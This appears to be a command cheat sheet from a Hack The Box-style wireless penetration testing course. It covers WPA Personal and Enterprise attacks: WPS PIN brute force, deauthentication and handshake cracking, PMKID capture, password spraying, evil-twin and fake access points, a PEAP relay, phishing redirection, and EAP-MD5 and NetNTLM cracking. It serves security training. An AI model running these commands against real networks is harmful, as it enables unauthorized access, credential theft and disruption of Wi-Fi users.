# WPA Personal Overview

| Wireshark Display Filter                                                              | Frame Type                        |
| ------------------------------------------------------------------------------------- | --------------------------------- |
| `(wlan.fc.type == 0) && (wlan.fc.type_subtype == 8)`                                  | Beacon                            |
| `(wlan.fc.type == 0) && (wlan.fc.type_subtype == 4)`                                  | Probe Request                     |
| `(wlan.fc.type == 0) && (wlan.fc.type_subtype == 5)`                                  | Probe Response                    |
| `(wlan.fc.type == 0) && (wlan.fc.type_subtype == 11)`                                 | Authentication                    |
| `(wlan.fc.type == 0) && (wlan.fc.type_subtype == 0)`                                  | Association Request               |
| `(wlan.fc.type == 0) && (wlan.fc.type_subtype == 1)`                                  | Association Response              |
| `eapol`                                                                               | EAPOL (Handshake)                 |
| `(wlan.fc.type == 0) && (wlan.fc.type_subtype == 12) or (wlan.fc.type_subtype == 10)` | Disassociation ∨ Deauthentication |


# Reconnaissance and Bruteforce

| Command                                         | Description                                                                                               |
| ----------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| `sudo airmon-ng start wlan0`<br>                | Enable monitor mode.                                                                                      |
| `sudo airodump-ng wlan0mon`                     | Scan for available Wi-Fi networks and their associated clients.                                           |
| `sudo airodump-ng wlan0mon -c 1 --wps`          | Scan for WPS-enabled Wi-Fi networks (using airodump-ng).                                                  |
| `sudo wash -j -i wlan0mon`                      | Scan for WPS-enabled Wi-Fi networks (using wash + verbose output).                                        |
| `grep -i "84-1B-5E" /var/lib/ieee-data/oui.txt` | See which vendor is associated with an access point, using the first half of the target AP's MAC address. |
| `sudo airmon-ng stop wlan0mon`                  | Turn off monitor mode.                                                                                    |
| `iw dev wlan0 interface add mon0 type monitor`  | Add a new monitor interface (using iw).                                                                   |
| `sudo ifconfig mon0 up`                         | Activate the new interface.                                                                               |
| `sudo reaver -i mon0 -c 1 -b <target_BSSID>`    | Perform WPS-PIN bruteforce with Reaver.                                                                   |


# Cracking MIC (4-Way Handshake)

| Command                                                      | Description                                                                                           |
| ------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------- |
| `sudo airmon-ng start wlan0`                                 | Enable monitor mode.                                                                                  |
| `sudo airodump-ng wlan0mon -c 1 -w WPA`                      | Scan for available Wi-Fi networks and their associated clients, saving the traffic to a capture file. |
| `sudo aireplay-ng -0 5 -a <AP_MAC> -c <client_MAC> wlan0mon` | Perform a deauthentication attack against a connected client.                                         |
| `cowpatty -c -r WPA-01.cap`                                  | Verify the WPA handshake.                                                                             |
| `cowpatty -r WPA-01.cap -f /opt/wordlist.txt -s <ESSID>`     | Crack the PSK from the captured WPA handshake using cowpatty.                                         |
| `aircrack-ng -w /opt/wordlist.txt -0 WPA-01.cap`             | Crack the PSK from the captured WPA handshake using aircrack-ng.                                      |


# PMKID Attack

| Command                                                                                                    | Description                                                |
| ---------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- |
| `sudo airmon-ng start wlan0`<br>                                                                           | Enable monitor mode.                                       |
| `sudo hcxdumptool -i wlan0mon --enable_status=3`                                                           | Scan for networks vulnerable to the PMKID attack.          |
| `sudo airodump-ng wlan0mon --essid <target_ESSID>`                                                         | Determine BSSID of the vulnerable network using its ESSID. |
| `hcxdumptool -i wlan0mon --enable_status=3 --filterlist_ap=<target_BSSID> --filtermode=2 -o HTBPMKID.pcap` | Capture the target's PMKID.                                |
| `hcxpcapngtool -o hash HTBPMKID.pcap`                                                                      | Convert the pcap to a usable hash format.                  |
| `hashcat -m 22000 --force hash /opt/wordlist.txt`                                                          | Crack the hash (using Hashcat).                            |
| `hashcat -m 22000 --force hash /opt/wordlist.txt --show`                                                   | Display the cracked password.                              |


# WPA Enterprise Reconnaissance

| Command                                                                                                           | Description                                                                                           |
| ----------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| `sudo airmon-ng start wlan0`<br>                                                                                  | Enable monitor mode.                                                                                  |
| `sudo airodump-ng wlan0mon -c 1 -w WPA`                                                                           | Scan for available Wi-Fi networks and their associated clients, saving the traffic to a capture file. |
| `tshark -r WPA-01.cap -Y '(eap && wlan.ra == 9c:9a:03:39:bd:7a) && (eap.identity)' -T fields -e eap.identity`<br> | Extract usernames from a packet capture (using tshark).                                               |
| `python2 /opt/crEAP/crEAP.py`                                                                                     | Extract usernames from a packet capture (using crEAP).                                                |
| `bash /opt/pcapFilter.sh -f /home/wifi/WPA-01.cap -C`                                                             | Extract the handshake certificate from packet capture.                                                |
| `sudo bash /opt/EAP_buster/EAP_buster.sh HTB-Corp 'HTB\Ketty' wlan0mon`                                           | Identify the authentication methods  available to the user.                                           |


# Performing Bruteforce Attacks

| Command                                                                                               | Description                                         |
| ----------------------------------------------------------------------------------------------------- | --------------------------------------------------- |
| `echo "HTB\Sentinal" > user.txt`                                                                      | Save the target username to a file.                 |
| `sudo python2 air-hammer.py -i wlan1 -e HTB-Corp -p /opt/rockyou.txt -u user.txt`                     | Execute a bruteforce attack using air-hammer.py.     |
| `cat /opt/statistically-likely-usernames/john.txt \| awk '{print "HTB\\" $1}' > domain_users.txt`<br> | Create a list of usernames with a domain prefix.    |
| `sudo python2 air-hammer.py -i wlan1 -e HTB-Corp -P football -u domain_users.txt`                     | Execute a password spray attack using air-hammer.py |
| `sudo python2 air-hammer.py -i wlan1 -e HTB-Corp -P football -u domain_users.txt -s 65`               | Resume a cancelled attack.                          |

# EAP Downgrade Attack

| Command                                                                                                        | Description                                                    |
| -------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------- |
| `openssl dhparam -out dh.pem 2048`                                                                             | Generate Diffie-Hellman parameters.                            |
| `openssl genrsa -out ca-key.pem 2048`                                                                          | Generate CA private key.                                       |
| `openssl req -new -x509 -nodes -days 100 -key ca-key.pem -out ca.pem`                                          | Generate CA certificate.                                       |
| `openssl req -newkey rsa:2048 -nodes -days 100 -keyout server-key.pem -out server-key.pem`<br>                 | Generate server private key.                                   |
| `openssl x509 -req -days 100 -set_serial 01 -in server-key.pem -out server.pem -CA ca.pem -CAkey ca-key.pem`   | Generate server certificate.                                   |
| `sudo hostapd-mana hostapd.conf`                                                                               | Start the fake access point using hostapd-mana.                |
| `/opt/eaphammer/eaphammer --cert-wizard`                                                                       | Generate self-signed certificates automatically with eaphammer. |
| `sudo /opt/eaphammer/eaphammer --interface wlan1 --negotiate balanced --auth wpa-eap --essid HTB-Corp --creds` | Start the fake access point using eaphammer.                   |


# Enterprise Evil-Twin Attack

| Command                                                                             | Description                                                      |
| ----------------------------------------------------------------------------------- | ---------------------------------------------------------------- |
| `cp /etc/hostapd-wpe/hostapd-wpe.conf hostapd-wpe.conf`                             | Make a copy of the hostapd-wpe configuration file.               |
| `sudo hostapd-wpe -c -k hostapd-wpe.conf`                                           | Start the fake access point using hostapd-wpe.                   |
| `/opt/eaphammer/eaphammer --cert-wizard`                                            | Generate self-signed certificates automatically using eaphammer. |
| `sudo /opt/eaphammer/eaphammer -i wlan1 -e HTB-Corp --auth wpa-eap --wpa-version 2` | Start the fake access point using eaphammer.                     |
| `hashcat -m 5500 -a 0 <captured_hash> wordlist.dict`                                | Crack the captured NetNTLM hash using Hashcat.                   |


# PEAP Relay Attack

| Command                                                                     | Description                                      |
| --------------------------------------------------------------------------- | ------------------------------------------------ |
| `sudo hostapd-mana ./hostapd.conf`                                          | Launch the fake access point using hostapd-mana. |
| `sudo /opt/wpa_sycophant/wpa_sycophant.sh -c wpa_sycophant.config -i wlan2` | Start the relay by initiating wpa-sycophant.     |

# Attacking EAP-TLS Authentication

| Command                                                               | Description                                                   |
| --------------------------------------------------------------------- | ------------------------------------------------------------- |
| `cp /etc/hostapd-wpe/hostapd-wpe.conf hostapd-wpe.conf`               | Make a copy of the hostapd-wpe configuration file.            |
| `cd /opt/hostapd-2.6 && patch -p1 < ../hostapd-wpe/hostapd-wpe.patch` | Apply the patch to the hostapd-2.6 source code.               |
| `cd /opt/hostapd-2.6/hostapd && make`                                 | Recompile hostapd with the updated configuration.             |
| `sudo /opt/hostapd-2.6/hostapd/hostapd-wpe hostapd-wpe.conf`          | Start the fake access point using the recompiled hostapd-wpe. |
| `sudo python2 nagaw.py -i wlan1 -o wlan2 -t demo`                     | Redirect clients to a phishing page using nagaw.py            |

# Cracking EAP-MD5

| Command                                                                                                          | Description                                                                 |
| ---------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------- |
| `echo 776b900e685dea0230b41eec2010535c \| sed 's/\(..\)/\1:/g;s/:$//'`                                           | Convert the Request Challenge EAP-MD5 value into Colon Hexadecimal format.  |
| `echo 054ea58706a52f0c95fc47ccf11eb5a1 \| sed 's/\(..\)/\1:/g;s/:$//'`                                           | Convert the Response Challenge EAP-MD5 value into Colon Hexadecimal format. |
| `eapmd5pass -w /opt/rockyou.txt -U administrator -C <request_challenge> -R <response_challenge> -E <request_id>` | Perform a dictionary attack to crack the EAP-MD5 hash.                      |